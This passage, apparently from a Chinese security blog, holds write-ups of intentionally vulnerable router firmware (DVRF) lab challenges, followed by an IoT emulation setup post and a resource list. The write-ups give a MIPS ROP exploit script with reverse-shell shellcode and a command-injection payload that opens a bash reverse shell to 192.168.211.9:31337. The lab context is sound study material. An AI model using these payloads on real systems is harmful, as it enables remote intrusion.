  listen_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    bzero( &amp;servaddr, <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line"> </span><br><span class="line">    servaddr.sin_family = AF_INET;</span><br><span class="line">    servaddr.sin_addr.s_addr = htons(INADDR_ANY);</span><br><span class="line">    servaddr.sin_port = htons(atoi(argv[<span class="number">1</span>]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Binding to port %i\n&quot;</span>, atoi(argv[<span class="number">1</span>]));</span><br><span class="line"> </span><br><span class="line">    retval = bind(listen_fd, (struct sockaddr *) &amp;servaddr, <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line"><span class="keyword">if</span> (retval == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error Binding to port %i\n&quot;</span>, atoi(argv[<span class="number">1</span>]));</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(setsockopt(listen_fd, SOL_SOCKET,SO_REUSEADDR, (<span class="keyword">char</span>*)&amp;option, <span class="keyword">sizeof</span>(option)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Setsockopt failed :(\n&quot;</span>);</span><br><span class="line">close(listen_fd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    listen(listen_fd, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    comm_fd = accept(listen_fd, (struct sockaddr*) <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">        bzero(str, <span class="number">500</span>);</span><br><span class="line">write(comm_fd, <span class="string">&quot;Send Me Bytes:&quot;</span>,<span class="number">14</span>);</span><br><span class="line">        read(comm_fd,str,<span class="number">500</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(endstr, <span class="string">&quot;nom nom nom, you sent me %s&quot;</span>, str);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Sent back - %s&quot;</span>,str);</span><br><span class="line">        write(comm_fd, endstr, <span class="built_in">strlen</span>(endstr)+<span class="number">1</span>);</span><br><span class="line">shutdown(comm_fd, SHUT_RDWR);</span><br><span class="line">shutdown(listen_fd, SHUT_RDWR);</span><br><span class="line">close(comm_fd);</span><br><span class="line">close(listen_fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0x42</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出在这句 <code>sprintf(endstr, &quot;nom nom nom, you sent me %s&quot;, str);</code> str 是 socket 传入的数据，长度内容为我们所控制，溢出 padding 为 51 </p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210314175958.png" alt="image-20210314175958380"></p><h3 id="调试方法-1"><a href="#调试方法-1" class="headerlink" title="调试方法"></a>调试方法</h3><p>在 ubuntu 16.04 下 gdb-multiarch <code>target remote :1234</code> 链接上后报错退出，切换到 attify 能继续使用最常规方式调试：qemu-user 模式加 <code>-g</code> 打开调试端口，gdb-multiarch <code>target remote :1234</code> 链接上去。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># terminal 1</span></span><br><span class="line">sudo qemu-mipsel-static -L . -g 1234 -strace ./pwnable/ShellCode_Required/socket_bof 8884</span><br><span class="line"><span class="comment"># terminal 2 gdb-multiarch</span></span><br><span class="line"><span class="built_in">set</span> architecture mips </span><br><span class="line"><span class="built_in">set</span> endian little</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure><p>另外一个调试方法是 qemu system 启动 mips 系统，然后传入一个 gdb-server ，在里面运行程序然后 gdb-server attach 程序，再在外面用 gdb 链接上去。</p><p>attify 里面 gdb 插件是 gef ，用 vmmap 读不出 libc 地址</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315180459.png" alt="image-20210315180459380"></p><p>曲线救国在 <code>0x00400D34 </code> 打下断点，单步跟进去查看 sprintf 的真实地址，然后再从 <code>./lib/libc.so.0</code> 读取偏移算出基地址</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315180734.png" alt="image-20210315180734572"></p><p>全部题目用的 libc 都同一个，需要 shellcode 的题目，换下 shellcode 就能通用 exp 。前面 <code>stack_bof_02</code> 是在 ubuntu16 里面的脚本 libc_base 和 attify 不一样要换下基地址。</p><blockquote><p>Stack_bof_02 的 execve(‘/bin/sh’) 能打通</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315222313.png" alt="image-20210315222312959"></p><p>找一个反弹 shell 的 shellcode 替换，或者将 shell 绑定到某个端口</p><blockquote><p>反弹 shell ：<a href="http://shell-storm.org/shellcode/files/shellcode-860.php">http://shell-storm.org/shellcode/files/shellcode-860.php</a></p><p>绑定 shell ：<a href="http://shell-storm.org/shellcode/files/shellcode-81.php">http://shell-storm.org/shellcode/files/shellcode-81.php</a></p></blockquote><p>绑定 shell 的 shellcode 预期是开在本地的 4919 端口，实际运行后发现并不是，要自己查端口 -。- ，然鹅 nc 连上去后程序会蹦掉。</p><p>反弹 shell 的 shellcode 预编是反弹到 <strong>192.168.1.177:31337</strong> ，要么修改网卡 ip ，要么就改一下 shellcode 传入的 ip </p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315201159.png" alt="image-20210315201159630"></p><p>将 ip 地址转换成 16 进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hex</span>(<span class="number">192</span>)<span class="comment">#0xc0</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">168</span>)<span class="comment">#0xa8</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">1</span>)<span class="comment">#0x01</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">177</span>)<span class="comment">#0xb1</span></span><br><span class="line"><span class="comment">#192.168.1.177==&gt;0xB101A8C0</span></span><br></pre></td></tr></table></figure><p>编译一下，编译失败看看是不是 binutils 没装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">asm(<span class="string">&quot;li $a1, 0xB101A8C0&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后搜索 <code>\x01\xb1\x05\x3c\xc0\xa8\xa5\x34</code> 替换为自己编译的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">stg3_SC = <span class="string">&quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20&quot;</span></span><br><span class="line"><span class="comment">#stg3_SC += &quot;\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;#192.168.1.177</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa5\xaf\xd3\x09\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;</span><span class="comment">#192.168.211.9</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xab\x0f\x02\x24\x0c\x09\x09\x01&quot;</span></span><br></pre></td></tr></table></figure><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line"></span><br><span class="line">libc_addr = <span class="number">0x4089b000</span><span class="comment">#0x766e5000</span></span><br><span class="line">sleep = <span class="number">0x0002F2B0</span></span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x2fb10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x76714b10:lia0,1</span></span><br><span class="line"><span class="string">   0x76714b14:movet9,s1</span></span><br><span class="line"><span class="string">   0x76714b18:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget2 = <span class="number">0x7730</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x766ec730:lwra,40(sp)</span></span><br><span class="line"><span class="string">   0x766ec734:lws3,36(sp)</span></span><br><span class="line"><span class="string">   0x766ec738:lws2,32(sp)</span></span><br><span class="line"><span class="string">   0x766ec73c:lws1,28(sp)</span></span><br><span class="line"><span class="string">   0x766ec740:lws0,24(sp)</span></span><br><span class="line"><span class="string">   0x766ec744:jrra</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget3 = <span class="number">0x20f1c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x76705f1c:movet9,s2</span></span><br><span class="line"><span class="string">   0x76705f20:lwra,36(sp)</span></span><br><span class="line"><span class="string">   0x76705f24:lws2,32(sp)</span></span><br><span class="line"><span class="string">   0x76705f28:lws1,28(sp)</span></span><br><span class="line"><span class="string">   0x76705f2c:lws0,24(sp)</span></span><br><span class="line"><span class="string">   0x76705f30:jrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget4 = <span class="number">0x16dd0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x766fbdd0:addiua0,sp,24</span></span><br><span class="line"><span class="string">   0x766fbdd4 &lt;optarg&gt;:movet9,s0</span></span><br><span class="line"><span class="string">   0x766fbdd8:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget5 = <span class="number">0x214a0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x767064a0:movet9,a0</span></span><br><span class="line"><span class="string">   0x767064a4:swv0,24(sp)</span></span><br><span class="line"><span class="string">   0x767064a8:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">stg3_SC = <span class="string">&quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20&quot;</span></span><br><span class="line"><span class="comment">#stg3_SC += &quot;\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;#192.168.1.177</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa5\xaf\xd3\x09\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;</span><span class="comment">#192.168.211.9</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xab\x0f\x02\x24\x0c\x09\x09\x01&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">51</span></span><br><span class="line">payload += p32(libc_addr+gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(libc_addr+gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(libc_addr+sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(libc_addr+gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(libc_addr+gadget5)<span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += p32(libc_addr+gadget4)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += stg3_SC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8882</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Send Me Bytes:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="socket-cmd"><a href="#socket-cmd" class="headerlink" title="socket_cmd"></a>socket_cmd</h2><p>远程命令注入，参考资料看下面：</p><blockquote><p><a href="https://www.yuque.com/bowu/blog/fhhefi">CTF之命令执行绕过总结</a></p><p><a href="https://whoamianony.top/2021/01/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%8F%8D%E5%BC%B9Shell%EF%BC%8C%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/">反弹Shell，看这一篇就够了</a></p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315232145.png" alt="image-20210315232145316"></p><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><p>依次打开终端运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#terminal 0</span></span><br><span class="line">qemu-mipsel-static -L . -strace ./pwnable/ShellCode_Required/socket_cmd 9999</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#terminal 1</span></span><br><span class="line">nc -lvvp 31337</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#tarminal 2</span></span><br><span class="line">nc 127.0.0.1 9999</span><br><span class="line">hacked|`bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.211.9/31337 0&gt;&amp;1&quot;</span>`</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315233919.png" alt="image-20210315233919821"></p><blockquote><p>是 iot 用户 nc 链接上去程序，程序是用 sudo 起来，所以切换到 root</p></blockquote><h2 id="Uaf-01-amp-heap-overflow"><a href="#Uaf-01-amp-heap-overflow" class="headerlink" title="Uaf_01&amp;heap_overflow"></a>Uaf_01&amp;heap_overflow</h2><p>剩下两题 heap_overflow 和 uaf_01 没有什么思路，都是输入一次然后程序就退出了。</p><p>uaf_01 重新申请相同 0x11 ，就跳转 <code>Awesome</code> 那个分支，但没啥用。</p><p>heap_overflow 有个后门，输入机会只有一次，然后程序就会关掉。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://ctf-wiki.org/pwn/linux/mips/mips_rop/">https://ctf-wiki.org/pwn/linux/mips/mips_rop/</a></p><p><a href="https://xz.aliyun.com/t/1511">https://xz.aliyun.com/t/1511</a></p><p><a href="https://www.cnblogs.com/hac425/p/9416864.html">https://www.cnblogs.com/hac425/p/9416864.html</a></p><p><a href="https://www.anquanke.com/post/id/184718">https://www.anquanke.com/post/id/184718</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOT环境配置V2</title>
      <link href="archives/a9578bea/"/>
      <url>archives/a9578bea/</url>
      
        <content type="html"><![CDATA[<h2 id="更新环境原因"><a href="#更新环境原因" class="headerlink" title="更新环境原因"></a>更新环境原因</h2><p>概述 V1版本情况：</p><ul><li>采用一台 ubuntu 1804 配有基本 pwn 工具、qemu static v5.2 、完整版 binwalk 等。承担固件包中单个文件模拟调试任务，以及通过 qemu 模拟异架构系统实现少部分路由器系统模拟。</li><li>采用 attify v3.0 (base ubuntu 18.04) 的 <a href="https://github.com/attify/firmware-analysis-toolkit">firmware-analysis-toolkit</a> 模拟路由器系统</li></ul><p>V1 版本出现几个问题：</p><ul><li><p>首先是个小问题很容易解决，就是用 qemu uesr 模式单文件模拟调试，gdb-multiarch 有时会连不上。查了下资料、问了问师傅推测可能是 gdb 版本问题。</p><p>解决方法换个 ubuntu（16、20）就行了，qemu 都是每个系统的标配。</p></li><li><p>用 ubuntu 1804 qemu system 模式异架构系统，再在 qemu 虚拟机上运行固件。导入固件文件后，启动脚本基本在 <code>/etc/rc.d/init.d</code> </p><blockquote><p><a href="https://blog.csdn.net/cradmin/article/details/2270497">linux /etc/rc.d/目录的详解-cradmin</a></p><p><a href="https://blog.csdn.net/qq_29350001/article/details/51788937">linux /etc/rc.d/目录的详解-聚优致成</a></p></blockquote><p>这种方法能成功跑起来次数不多，但 qemu 使用桥接模式，让 qemu 虚拟机可与宿主机同一网段，方便调试抓包等。</p></li><li><p>当 ubuntu 1804 qemu system 模拟固件不成功，我就会尝试用 attify FAT 模拟，成功率到时挺高的，但由于 FAT 将 firmadyne 全部操作都整合起来，导致难以个性化修改。比较突出就是：</p><ul><li><p>自动生成启动脚本 <code>run.sh</code> 所配置的网络不能与宿主机在同一个网段，而是和 attify 在同一网段，导致如果想抓包，进行整系统测试时，只能在 attify 中完成。</p><blockquote><p>自动生成脚本在 attify 中新建一个网卡 192.168.0.2 ，链接到 qemu 虚拟机中，虚拟机网卡为 192.168.0.1 。attify 访问 192.168.0.1 即访问路由器后台</p></blockquote><p>尝试修改修改 run.sh 的启动模式，将网络模式修改为桥接，手动创建网桥、tap0 网卡等。异架构 debian 可以成功分配到宿主机网段 ip 出网，对于路由器固件就不行，原因未知。</p></li><li><p>firmadyne 是将固件制作成镜像模拟，也就是说 ssh 密码、 root 密码等等都是固件原有的。当模拟起来后，连不上 shell 就别想着查询端口，通过进程查询提供服务的文件 ……</p><p>这个问题解决方法就是放弃 FAT ，自己手工完成 firmadyne 模拟准备工作。解压固件后，将 <code>/etc/shadow</code> 替换一下，然后才制作镜像。问题在于说 attify 在进行解压时连不上 PostgreSQL ，使用 FAT 脚本就能连上。</p></li></ul></li><li><p>在原有 ubuntu 1804 上搭建 firmadyne ，可能安装脚本部分东西与原有环境有冲突装不上。firmadyne 的 docker 版本没有尝试过。</p></li></ul><p>V2 版本设想的几种方案：</p><ol><li>解决 firmadyne 模拟路由器固件桥接网络不成功问题，让路由器与宿主机在同一网段。</li><li>firmadyne docker 不过这个也是要解决网段问题……</li><li>在 ubuntu 1804 上搭 firmadyne ，放弃分配宿主机网段，直接在 ubuntu 里完成工作</li></ol><p>存一下参考文章</p><ul><li><p>解决出网问题</p><p><a href="https://wzt.ac.cn/2020/01/08/iot_brief/">firmadyne 简单使用指南 &amp; 模拟示例</a></p><p><a href="https://wzt.ac.cn/2019/09/10/QEMU-networking/">QEMU 网络配置一把梭</a></p></li><li><p>将 firmadyne 部署在云端</p><p><a href="https://zhuanlan.zhihu.com/p/110806057">Firmadyne的固件模拟环境搭建(超详细)</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> firmadyne </tag>
            
            <tag> attify </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器资源整理</title>
      <link href="archives/e244711/"/>
      <url>archives/e244711/</url>
      
        <content type="html"><![CDATA[<h2 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h2><h3 id="Dlink"><a href="#Dlink" class="headerlink" title="Dlink"></a>Dlink</h3><p>  • 国内：<a href="http://support.dlink.com.cn:9000/">http://support.dlink.com.cn:9000/</a><br>  • 台湾/香港：<a href="http://www.dlinktw.com.tw/techsupport">http://www.dlinktw.com.tw/techsupport</a><br>  • 老旧设备资源（均为US版）：<a href="https://legacy.us.dlink.com/">https://legacy.us.dlink.com/</a></p><h2 id="CVE-仓库"><a href="#CVE-仓库" class="headerlink" title="CVE 仓库"></a>CVE 仓库</h2><p>  • <a href="https://github.com/PAGalaxyLab/VulInfo">https://github.com/PAGalaxyLab/VulInfo</a><br>  • <a href="https://github.com/GD008/vuln">https://github.com/GD008/vuln</a></p><h2 id="厂商安全公告"><a href="#厂商安全公告" class="headerlink" title="厂商安全公告"></a>厂商安全公告</h2><p>  • Dlink：<a href="http://forums.dlink.com/index.php?board=528.0">http://forums.dlink.com/index.php?board=528.0</a><br>      含有 patch 版本下载</p><h2 id="漏洞披露平台"><a href="#漏洞披露平台" class="headerlink" title="漏洞披露平台"></a>漏洞披露平台</h2><p>​    • <a href="https://www.cnvd.org.cn/flaw/list.htm">https://www.cnvd.org.cn/flaw/list.htm</a></p><h2 id="学习文档"><a href="#学习文档" class="headerlink" title="学习文档"></a>学习文档</h2><h3 id="总结性-WIKI"><a href="#总结性-WIKI" class="headerlink" title="总结性 WIKI"></a>总结性 WIKI</h3><p>  • 伏宸安全物联网安全百科：<a href="https://github.com/yaseng/iot-security-wiki">https://github.com/yaseng/iot-security-wiki</a><br>  • Tide安全Iot物联网安全wiki：<a href="https://www.yuque.com/tidesec/iot">https://www.yuque.com/tidesec/iot</a><br>  • 海特实验室IOTWIKI：<a href="https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki">https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki</a><br>  • 绿盟智能设备安全分析手册：<a href="https://book.yunzhan365.com/tkgd/lzkp/mobile/index.html">https://book.yunzhan365.com/tkgd/lzkp/mobile/index.html</a></p><h3 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h3><p><a href="https://www.anquanke.com/post/id/202965">MIPS 指令集 Shellcode 编写入门</a></p><h2 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h2><p>  • 各种架构 gdbserver ：<a href="https://github.com/rapid7/embedded-tools">https://github.com/rapid7/embedded-tools</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 资料 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-5767 栈溢出漏洞复现</title>
      <link href="archives/266/"/>
      <url>archives/266/</url>
      
